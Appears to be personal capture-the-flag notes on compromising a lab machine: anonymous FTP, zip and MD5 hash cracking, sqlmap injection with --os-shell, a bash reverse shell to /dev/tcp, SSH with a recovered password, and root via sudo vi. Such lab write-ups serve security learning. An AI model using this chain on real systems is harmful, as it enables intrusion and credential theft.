#friendly nmap scan here

21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.250
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
________________________________________________________________________________________________________________________
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
________________________________________________________________________________________________________________________
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
________________________________________________________________________________________________________________________
#File Transfer Protocol

└─$ ftp 10.129.95.174
Connected to 10.129.95.174.
220 (vsFTPd 3.0.3)
Name (10.129.95.174:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
lRemote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Entering Extended Passive Mode (|||10291|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.

ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10445|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |******************************************************************************************************************************************>
226 Transfer complete.
2533 bytes received in 00:00 (5.93 KiB/s)

ftp> ls
rm 229 Entering Extended Passive Mode (|||10971|)
-150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.

ftp> rm -rf backup.zip
usage: rmdir directory-name
ftp> ls
229 Entering Extended Passive Mode (|||10431|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> exit
221 Goodbye.

________________________________________________________________________________________________________________________

#Password Cracking

└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)
1g 0:00:00:00 DONE (2025-08-06 11:47) 20.00g/s 163840p/s 163840c/s 163840C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
________________________________________________________________________________________________________________________

─$ cat index.php
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>

2cb42f8734ea607eefed3b70af13bbd3:qwerty789     #using this we can log into the webiste
________________________________________________________________________________________________________________________

#SQL- Map

──(kali㉿kali)-[~/Documents/vaccine]
└─$ sqlmap -u 'http://10.129.113.135/dashboard.php?search=Hello+baby/' --cookie='PHPSESSID=f3hj2svdd1i1rtvvrfdveluu3i'

[10:56:04] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[10:56:07] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable
[10:56:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:56:07] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable
[10:56:07] [INFO] testing 'PostgreSQL inline queries'
[10:56:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:56:07] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)                                           >
[10:56:21] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable
[10:56:21] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:56:34] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable
[10:56:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
________________________________________________________________________________________________________________________

#got a shell with this
└─$ sqlmap -u 'http://ip.135/dashboard.php?search=Hello+baby/' --cookie='PHPSESSID=f3hj2svdd1i1rtvvrfdveluu3i' --os-shell

#Shell
# got a full shell with this
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"

 nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.139] from (UNKNOWN) [10.129.113.135] 51502
bash: cannot set terminal process group (1594): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$ whoami
whoami
postgres
postgres@vaccine:/var/lib/postgresql/11/main$
________________________________________________________________________________________________________________________

# Inside your reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Background the shell
CTRL+Z

# On your local terminal:
stty raw -echo; fg
# Then press: ENTER twice
________________________________________________________________________________________________________________________

#SSH
NO LUCK AT STRATING BUT IN END GOT IT WITH CREDENTIALS

#GOT IN WITH THIS (the cred. were found through nc shell)
ssh postgres@10.129.67.40
The authenticity of host '10.129.67.40 (10.129.67.40)' can't be established.
ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.129.67.40' (ED25519) to the list of known hosts.
postgres@10.129.67.40's password: P@s5w0rd!
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)

postgres@vaccine:~$
________________________________________________________________________________________________________________________

#finally
# this is used in the final enum part
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
[sudo] password for postgres:

# whoami
root

# cd /root
# ls
pg_hba.conf  root.txt  snap

# cd /bin/shell
/bin/sh: 4: cd: can't cd to /bin/shell
# bash

root@vaccine:~# ls
pg_hba.conf  root.txt  snap
root@vaccine:~# cat root.txt
#rootflag
